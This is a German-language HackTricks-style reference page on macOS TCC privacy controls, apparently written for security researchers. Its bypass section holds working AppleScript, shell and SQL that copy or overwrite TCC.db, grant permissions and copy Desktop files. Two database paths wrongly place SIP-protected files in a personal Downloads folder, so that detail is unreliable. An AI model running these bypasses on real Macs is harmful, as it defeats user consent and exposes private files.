# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Grundlegende Informationen**

**TCC (Transparency, Consent, and Control)** ist ein Sicherheitsprotokoll zur Regulierung von Anwendungsberechtigungen. Seine Hauptaufgabe besteht darin, sensible Funktionen wie **Ortungsdienste, Kontakte, Fotos, Mikrofon, Kamera, Bedienungshilfen und vollständigen Festplattenzugriff** zu schützen. Indem TCC vor dem Gewähren des Zugriffs einer Anwendung auf diese Elemente die ausdrückliche Zustimmung des Benutzers verlangt, verbessert es den Datenschutz und die Kontrolle der Benutzer über ihre Daten.

Benutzer begegnen TCC, wenn Anwendungen Zugriff auf geschützte Funktionen anfordern. Dies wird durch eine Eingabeaufforderung angezeigt, über die Benutzer den **Zugriff genehmigen oder verweigern** können. Darüber hinaus unterstützt TCC direkte Benutzeraktionen, beispielsweise das **Ziehen und Ablegen von Dateien in eine Anwendung**, um Zugriff auf bestimmte Dateien zu gewähren. Dadurch haben Anwendungen nur Zugriff auf das, was ausdrücklich erlaubt wurde.

![Ein Beispiel für eine TCC-Eingabeaufforderung](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** wird durch den **Daemon** unter `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` verwaltet und in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` konfiguriert (wobei der Mach-Service `com.apple.tccd.system` registriert wird).

Für jeden angemeldeten Benutzer läuft ein **user-mode tccd**, der in `/System/Library/LaunchAgents/com.apple.tccd.plist` definiert ist und die Mach-Services `com.apple.tccd` und `com.apple.usernotifications.delegate.com.apple.tccd` registriert.

Hier ist tccd zu sehen, das sowohl als System als auch als Benutzer ausgeführt wird:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Berechtigungen werden von der **übergeordneten** Anwendung **geerbt**, und die **Berechtigungen** werden anhand der **Bundle ID** und der **Developer ID** **nachverfolgt**.

### TCC-Datenbanken

Die Zulassungen/Verweigerungen werden anschließend in einigen TCC-Datenbanken gespeichert:

- Die systemweite Datenbank unter **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Diese Datenbank ist durch **SIP geschützt**, daher kann nur ein SIP bypass in sie schreiben.
- Die Benutzer-TCC-Datenbank **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** für benutzerspezifische Einstellungen.
- Diese Datenbank ist geschützt, sodass nur Prozesse mit hohen TCC-Berechtigungen wie Full Disk Access in sie schreiben können (sie ist jedoch nicht durch SIP geschützt).

> [!WARNING]
> Die vorherigen Datenbanken sind auch beim **Lesezugriff durch TCC geschützt**. Daher kannst du deine reguläre Benutzer-TCC-Datenbank **nicht lesen**, außer der Zugriff erfolgt durch einen TCC-privilegierten Prozess.
>
> Denke jedoch daran, dass ein Prozess mit diesen hohen Berechtigungen (wie **FDA** oder **`kTCCServiceEndpointSecurityClient`**) in die TCC-Datenbank der Benutzer schreiben kann.

- Es gibt eine **dritte** TCC-Datenbank unter **`/var/db/locationd/clients.plist`**, die angibt, welche Clients auf **Ortungsdienste** zugreifen dürfen.
- Die durch SIP geschützte Datei **`/Users/carlospolop/Downloads/REG.db`** (auch beim Lesen durch TCC geschützt) enthält den **Speicherort** aller **gültigen TCC-Datenbanken**.
- Die durch SIP geschützte Datei **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (auch beim Lesen durch TCC geschützt) enthält weitere durch TCC gewährte Berechtigungen.
- Die durch SIP geschützte Datei **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (kann von jedem gelesen werden) ist eine Allowlist von Anwendungen, die eine TCC-Ausnahme benötigen.

> [!TIP]
> Die TCC-Datenbank in **iOS** befindet sich unter **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> Die **Benachrichtigungscenter-UI** kann **Änderungen an der systemweiten TCC-Datenbank** vornehmen:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Benutzer können jedoch mit dem Befehlszeilenprogramm **`tccutil`** Regeln **löschen oder abfragen**.

#### Abfragen der Datenbanken

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Wenn du beide Datenbanken überprüfst, kannst du kontrollieren, welche Berechtigungen eine App erlaubt, verweigert oder nicht hat (sie wird danach fragen).

- **`service`** ist die Zeichenfolgendarstellung der TCC-**Berechtigung**
- **`client`** ist die **Bundle-ID** oder der **Pfad zur Binärdatei** mit den Berechtigungen
- **`client_type`** gibt an, ob es sich um einen Bundle Identifier (0) oder einen absoluten Pfad (1) handelt

<details>

<summary>Ausführung bei einem absoluten Pfad</summary>

Führe einfach **`launctl load you_bin.plist`** aus, mit einer plist wie:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
- **`auth_value`** kann verschiedene Werte haben: denied(0), unknown(1), allowed(2) oder limited(3).
- **`auth_reason`** kann folgende Werte annehmen: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Das Feld **`csreq`** gibt an, wie das auszuführende Binary verifiziert und die TCC-Berechtigungen erteilt werden sollen:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Weitere Informationen zu den **anderen Feldern** der Tabelle findest du in [**diesem Blogbeitrag**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[1]</sup>

Du kannst auch **bereits erteilte Berechtigungen** für Apps unter `Systemeinstellungen --> Sicherheit & Datenschutz --> Datenschutz --> Dateien und Ordner` überprüfen.

> [!TIP]
> Benutzer _können_ **Regeln löschen oder abfragen** mit **`tccutil`** .

#### TCC-Berechtigungen zurücksetzen
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC-Signaturprüfungen

Die TCC-**Datenbank** speichert die **Bundle ID** der Anwendung, aber sie **speichert** auch **Informationen** über die **Signatur**, um **sicherzustellen**, dass die App, die um die Verwendung einer Berechtigung bittet, die richtige ist.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Daher können andere Anwendungen mit demselben Namen und derselben Bundle-ID nicht auf gewährte Berechtigungen zugreifen, die anderen Apps erteilt wurden.

### Entitlements & TCC-Berechtigungen

Apps müssen **nicht nur den Zugriff** auf bestimmte Ressourcen **anfordern** und **gewährt bekommen**, sie müssen außerdem über die **relevanten Entitlements** verfügen.\
**Telegram** besitzt beispielsweise das Entitlement `com.apple.security.device.camera`, um **Zugriff auf die Kamera anzufordern**. Eine **App**, die dieses **Entitlement nicht besitzt, kann nicht** auf die Kamera zugreifen (und der Benutzer wird nicht einmal nach den Berechtigungen gefragt).

Beachte, dass Entitlements plist-Dateien sind und Teil der code sig sind. Sie werden in der code sig durch spezielle Slots zusätzlich gehasht und können entweder vom Kernel mittels Kernel-Code oder vom user model code über `csops(#169)` oder `csops_audittoken(#170)` abgefragt werden.

Damit Apps jedoch auf **bestimmte Benutzerordner** wie `~/Desktop`, `~/Downloads` und `~/Documents` **zugreifen** können, benötigen sie **keine** spezifischen **Entitlements.** Das System handhabt den Zugriff transparent und **fragt den Benutzer** bei Bedarf.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Die Apps von Apple **erzeugen keine Prompts**. Sie enthalten **vorab gewährte Rechte** in ihrer **Entitlements-Liste**, wodurch sie **niemals ein Popup erzeugen** und **auch in keiner der TCC-Datenbanken auftauchen.** Zum Beispiel:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Dies verhindert, dass Calendar den Benutzer auffordert, auf Erinnerungen, den Kalender und das Adressbuch zuzugreifen.

> [!TIP]
> Neben einigen offiziellen Dokumentationen zu Entitlements ist es auch möglich, **interessante inoffizielle Informationen über Entitlements unter** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) zu finden.

Einige TCC-Berechtigungen sind: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos ... Es gibt keine öffentliche Liste, in der alle definiert sind, aber du kannst diese [**Liste der bekannten Berechtigungen**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) prüfen.<sup>[1]</sup>

### Sensible ungeschützte Orte

- $HOME (selbst)
- $HOME/.ssh, $HOME/.aws usw.
- /tmp

### Benutzerintention / com.apple.macl

Wie bereits erwähnt, ist es möglich, **einer App Zugriff auf eine Datei zu gewähren, indem die Datei per Drag\&Drop auf die App gezogen wird**. Dieser Zugriff wird in keiner TCC-Datenbank angegeben, sondern als **erweitertes** **Attribut der Datei** gespeichert. Dieses Attribut **speichert die UUID** der berechtigten App:<sup>[2]</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Es ist bemerkenswert, dass das Attribut **`com.apple.macl`** von der **Sandbox** und nicht von tccd verwaltet wird.
>
> Beachte außerdem: Wenn du eine Datei, die die UUID einer App auf deinem Computer enthält, auf einen anderen Computer verschiebst, gewährt sie dieser App keinen Zugriff, da dieselbe App dort andere UIDs haben wird.

Das erweiterte Attribut `com.apple.macl` **kann nicht gelöscht werden** wie andere erweiterte Attribute, da es **durch SIP geschützt** ist. Wie jedoch [**in diesem Beitrag erklärt**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), ist es möglich, es zu deaktivieren, indem man die Datei **zippt**, sie **löscht** und anschließend **entzippt**.<sup>[3]</sup>






## XNU-Mechanismus für den verantwortlichen Prozess

In macOS/iOS ist der Mechanismus für den **verantwortlichen Prozess** ein wichtiges Sicherheitsfeature, das vom **TCC (Transparency, Consent, and Control)**-Framework und anderen Sicherheitssystemen verwendet wird, um nachzuverfolgen, welcher Prozess letztlich für eine Aktion verantwortlich ist, auch über Ketten von Kindprozessen hinweg.

Wenn TCC Berechtigungen prüft (z. B. für Kamera, Mikrofon oder Standort), überprüft es nicht immer den unmittelbaren Prozess, der die Anfrage stellt. Stattdessen prüft es den **verantwortlichen Prozess** - normalerweise die GUI-Anwendung, die die Aktion initiiert hat, selbst wenn die eigentliche Anfrage von einem Hilfsprozess oder Daemon kommt.

<details>
<summary>Festlegung des verantwortlichen Prozesses</summary>

### Felder der Prozessstruktur

Jeder Prozess in XNU verwaltet zwei wichtige UUID-Kennungen:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Die eigene UUID des Prozesses (aus dem `LC_UUID`-Ladebefehl seiner Mach-O-Binärdatei)
- **`p_responsible_pid`**: Die PID des verantwortlichen Prozesses
- **`p_responsible_uuid`**: Die UUID des verantwortlichen Prozesses (bleibt auch nach Beendigung dieses Prozesses bestehen)

### Festlegung des verantwortlichen Prozesses

1. **Während der Prozesserstellung (`Fork`)**

Wenn ein neuer Prozess über `fork()` oder `posix_spawn()` erstellt wird, wird der verantwortliche Prozess vom übergeordneten Prozess übernommen (der `exec()`-Syscall verwendet die bestehende `proc`-Struktur wieder, daher wird dieser Schritt dort nicht wiederholt):

**Speicherort**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Wichtige Punkte:**
- Untergeordnete Prozesse **übernehmen** die `p_responsible_pid` des übergeordneten Prozesses
- Dadurch entsteht eine **Verantwortungskette** innerhalb der Prozesshierarchie
- Der verantwortliche Prozess verweist typischerweise auf die ursprüngliche GUI-Anwendung

2. **Die Kernfunktion: `proc_set_responsible_pid()`**

**Speicherort**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Was diese Funktion tut:**
1. **Setzt die verantwortliche PID** im Zielprozess
2. **Ermittelt den verantwortlichen Prozess** mithilfe von `proc_find()` (erhöht den Referenzzähler)
3. **Kopiert die UUID** von `p_uuid` des verantwortlichen Prozesses nach `p_responsible_uuid` des Zielprozesses
4. **Gibt die Referenz frei** mit `proc_rele()` (verringert den Referenzzähler)

3. **Warum sowohl PID als auch UUID speichern?**

Der Ansatz mit doppelter Speicherung löst ein kritisches Problem:

| Feld | Zweck | Problem | Lösung |
|-------|---------|---------|----------|
| `p_responsible_pid` | Schnelles Nachschlagen des aktuellen Prozesses | PID kann nach dem Beenden eines Prozesses wiederverwendet werden | Wird für die Suche nach aktiven Prozessen verwendet |
| `p_responsible_uuid` | Persistente Identifikation | Bleibt nach der Beendigung des Prozesses erhalten | Wird für Sicherheitsprüfungen und Auditing verwendet |

**Das Problem**: Wenn der verantwortliche Prozess vor dem untergeordneten Prozess beendet wird, kann die PID recycelt und einem vollständig anderen Prozess zugewiesen werden.

**Die Lösung**: Die UUID ist unveränderlich und identifiziert die spezifische Binärdatei, die verantwortlich war, eindeutig, auch nachdem sie beendet wurde.

### Ablauf der Prozesserstellung
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID-Quelle: LC_UUID Load Command

Die in `p_uuid` gespeicherte UUID stammt aus dem **`LC_UUID` Load Command der Mach-O-Executable**:

1. **Kompilierungszeitpunkt**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Ausführungszeit**

**Location**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **In der Prozessstruktur gespeichert**

**Speicherort**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Ort**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### In TCC einfügen

Wenn du irgendwann Schreibzugriff auf eine TCC-Datenbank erhältst, kannst du etwas wie das Folgende verwenden, um einen Eintrag hinzuzufügen (Kommentare entfernen):

<details>

<summary>Beispiel zum Einfügen in TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Wenn du es geschafft hast, in eine App mit bestimmten TCC-Berechtigungen einzudringen, sieh dir die folgende Seite mit TCC payloads an, um diese zu missbrauchen:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Erfahre mehr über Apple Events unter:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Der TCC-Name der Automation-Berechtigung lautet: **`kTCCServiceAppleEvents`**\
Diese spezifische TCC-Berechtigung gibt außerdem die **Anwendung an, die verwaltet werden kann**, innerhalb der TCC-Datenbank an (die Berechtigung erlaubt also nicht, einfach alles zu verwalten).

**Finder** ist eine Anwendung, die **immer über FDA verfügt** (auch wenn dies nicht in der UI angezeigt wird). Wenn du also **Automation**-Berechtigungen für diese Anwendung hast, kannst du ihre Berechtigungen missbrauchen, um **sie bestimmte Aktionen ausführen zu lassen**.\
In diesem Fall würde deine App die Berechtigung **`kTCCServiceAppleEvents`** für **`com.apple.Finder`** benötigen.<sup>[4]</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Dies könntest du missbrauchen, um **deine eigene TCC-Datenbank des Benutzers zu schreiben**.

> [!WARNING]
> Mit dieser Berechtigung kannst du **Finder auffordern, auf durch TCC eingeschränkte Ordner zuzugreifen** und dir die Dateien zu geben, aber soweit ich weiß, **wirst du Finder nicht dazu bringen können, beliebigen Code auszuführen**, um seinen FDA-Zugriff vollständig zu missbrauchen.
>
> Daher wirst du nicht in der Lage sein, die vollständigen FDA-Fähigkeiten zu missbrauchen.

Dies ist der TCC-Prompt, um Automation-Berechtigungen für Finder zu erhalten:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Beachte, dass die **Automator**-App aufgrund der TCC-Berechtigung **`kTCCServiceAppleEvents`** jede App **steuern kann**, beispielsweise Finder. Wenn du also die Berechtigung hast, Automator zu steuern, könntest du auch den **Finder** mit einem Code wie dem folgenden steuern:

<details>

<summary>Eine Shell innerhalb von Automator öffnen</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Dasselbe geschieht mit der **Script Editor app,** sie kann Finder steuern, aber mithilfe eines AppleScript kannst du sie nicht dazu zwingen, ein Script auszuführen.

### Automation (SE) für einige TCC

**System Events kann Folder Actions erstellen, und Folder Actions können auf einige TCC-Ordner zugreifen** (Desktop, Documents und Downloads). Daher kann ein Script wie das folgende verwendet werden, um dieses Verhalten auszunutzen:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** zu FDA\*

Automation bei **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) ermöglicht das Senden von **keystrokes an Prozesse**. Auf diese Weise könnte man den Finder missbrauchen, um die TCC.db des Benutzers zu ändern oder einer beliebigen App FDA zu gewähren (obwohl dafür möglicherweise ein Passwort abgefragt wird).

Beispiel für das Überschreiben der TCC.db des Benutzers mit dem Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` to FDA\*

Prüfe diese Seite auf einige [**payloads to abuse the Accessibility permissions**](macos-tcc-payloads.md#accessibility), um beispielsweise per privesc zu FDA\* zu gelangen oder einen Keylogger auszuführen.

### **Endpoint Security Client to FDA**

Wenn du **`kTCCServiceEndpointSecurityClient`** hast, hast du FDA. Ende.

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`** erlaubt es, das **`NFSHomeDirectory`**-Attribut eines Benutzers zu **ändern**, wodurch dessen Home-Ordner geändert wird und somit ein **TCC-Bypass** möglich ist.

### User TCC DB to FDA

Wenn du **Schreibberechtigungen** für die **User-TCC**-Datenbank erhältst, **kannst** du dir selbst **keine** **`FDA`**-Berechtigungen gewähren; nur diejenige, die sich in der Systemdatenbank befindet, kann diese gewähren.

Du kannst dir jedoch **`Automation rights to Finder`** geben und die vorherige Technik missbrauchen, um zu FDA\* zu eskalieren.

### **FDA to TCC permissions**

**Full Disk Access** heißt in TCC **`kTCCServiceSystemPolicyAllFiles`**.

Ich glaube nicht, dass dies eine echte privesc ist, aber falls du es nützlich findest: Wenn du ein Programm mit FDA kontrollierst, kannst du die **TCC-Datenbank des Benutzers ändern und dir selbst beliebigen Zugriff gewähren**. Dies kann als Persistenztechnik nützlich sein, falls du deine FDA-Berechtigungen verlieren könntest.

### **SIP Bypass to TCC Bypass**

Die **TCC-Datenbank** des Systems wird durch **SIP** geschützt. Deshalb können nur Prozesse mit den **angegebenen Entitlements** sie ändern. Wenn ein Angreifer daher einen **SIP-Bypass** für eine **Datei** findet (also eine durch SIP geschützte Datei ändern kann), kann er:

- **Den Schutz** einer TCC-Datenbank **entfernen** und sich alle TCC-Berechtigungen gewähren. Er könnte beispielsweise eine dieser Dateien missbrauchen:
- Die TCC-Systemdatenbank
- REG.db
- MDMOverrides.plist

